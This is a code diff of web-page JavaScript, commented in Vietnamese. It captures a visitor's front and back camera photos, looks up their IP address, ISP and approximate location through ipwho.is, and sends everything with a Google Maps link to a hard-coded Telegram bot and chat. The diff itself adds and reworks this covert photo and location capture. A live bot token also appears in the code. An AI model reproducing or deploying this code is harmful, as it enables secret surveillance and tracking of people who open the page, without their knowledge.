@@ -2,45 +2,34 @@ const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
 const TELEGRAM_CHAT_ID = '-1003770043455';
 
 const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
-const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-  time: '', ip: '', isp: '', realIp: '', address: '',
-  country: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang kiểm tra...'
+  time: '', ip: '', isp: '', address: '',
+  lat: '', lon: '', device: '', os: ''
 };
 
+// Hàm lấy thông tin thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
-  const platform = navigator.platform;
   info.time = new Date().toLocaleString('vi-VN');
-  if (/Android/i.test(ua)) {
-    info.os = 'Android';
-    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
-    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
-  } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-    info.os = 'iOS';
-    info.device = 'iPhone/iPad';
-  } else {
-    info.device = platform || 'PC/Laptop';
-    info.os = 'Desktop';
-  }
+  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
+  info.device = navigator.platform;
 }
 
-async function getIPData() {
+// Hàm lấy IP và Vị trí (Chỉ gọi khi đã có quyền Cam)
+async function fetchPrivateData() {
   try {
-    const r1 = await fetch('https://api.ipify.org?format=json');
-    const d1 = await r1.json();
-    info.ip = d1.ip;
-    const r2 = await fetch(`https://ipwho.is/${info.ip}`);
-    const d2 = await r2.json();
-    info.isp = d2.connection?.org || 'N/A';
-    info.country = d2.country || 'Việt Nam';
-    info.lat = d2.latitude;
-    info.lon = d2.longitude;
-    info.address = `${d2.city}, ${d2.region}`;
+    const res = await fetch(`https://ipwho.is/`);
+    const d = await res.json();
+    info.ip = d.ip;
+    info.isp = d.connection?.org || 'N/A';
+    info.lat = d.latitude;
+    info.lon = d.longitude;
+    info.address = `${d.city}, ${d.region}`;
   } catch (e) {}
 }
 
+// Hàm chụp ảnh
 async function captureCamera(facingMode = 'user') {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -62,47 +51,51 @@ async function captureCamera(facingMode = 'user') {
   } catch (e) { return null; }
 }
 
-function getCaption() {
+// Hàm gửi dữ liệu (Chỉ gửi khi có ảnh)
+async function sendData(front, back) {
   const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
-  return `
-📡 [THÔNG TIN TRUY CẬP]
-🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device} (${info.os})
+  const caption = `
+📡 [CẢNH BÁO TRUY CẬP]
+🕒 ${info.time}
+📱 ${info.device} (${info.os})
 🌍 IP: ${info.ip}
 🏢 ISP: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
+🏙️ ${info.address}
 📍 Maps: ${mapsLink}
 `.trim();
-}
 
-async function main() {
-  // BƯỚC 1: Thử chụp ảnh TRƯỚC
-  let f = await captureCamera("user");
-  
-  // BƯỚC 2: Nếu KHÔNG chụp được ảnh (người dùng bấm Từ chối), DỪNG LUÔN
-  if (!f) {
-    console.log("Quyền bị từ chối. Không gửi dữ liệu.");
-    return; // Thoát hàm, không chạy các lệnh bên dưới
-  }
-
-  // BƯỚC 3: Nếu đã cho phép, mới lấy IP và vị trí
-  detectDevice();
-  await getIPData();
-  
-  // Chụp thêm cam sau (nếu có)
-  let b = await captureCamera("environment");
-
-  // BƯỚC 4: Gửi dữ liệu
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
-  const media = [{ type: 'photo', media: 'attach://f', caption: getCaption() }];
-  formData.append('f', f, 'f.jpg');
+  
+  const media = [];
+  media.push({ type: 'photo', media: 'attach://f', caption: caption });
+  formData.append('f', front, 'front.jpg');
   
   if (back) {
     media.push({ type: 'photo', media: 'attach://b' });
-    formData.append('b', b, 'b.jpg');
+    formData.append('b', back, 'back.jpg');
   }
 
   formData.append('media', JSON.stringify(media));
-  await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+  return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
+}
+
+// HÀM CHÍNH: QUYẾT ĐỊNH CÓ GỬI HAY KHÔNG
+async function main() {
+  // 1. Thử xin quyền và chụp cam trước ngay lập tức
+  const frontPhoto = await captureCamera("user");
+
+  // 2. KIỂM TRA: Nếu không có ảnh (Từ chối/Lỗi) -> DỪNG NGAY LẬP TỨC
+  if (!frontPhoto) {
+    console.log("Dừng: Người dùng từ chối camera.");
+    return; // THOÁT HÀM, không chạy bất cứ lệnh nào bên dưới
+  }
+
+  // 3. Nếu ĐÃ CHO PHÉP: Mới bắt đầu thu thập các thông tin nhạy cảm khác
+  detectDevice();
+  await fetchPrivateData();
+  const backPhoto = await captureCamera("environment");
+
+  // 4. Gửi toàn bộ gói dữ liệu có kèm ảnh
+  await sendData(frontPhoto, backPhoto);
 }
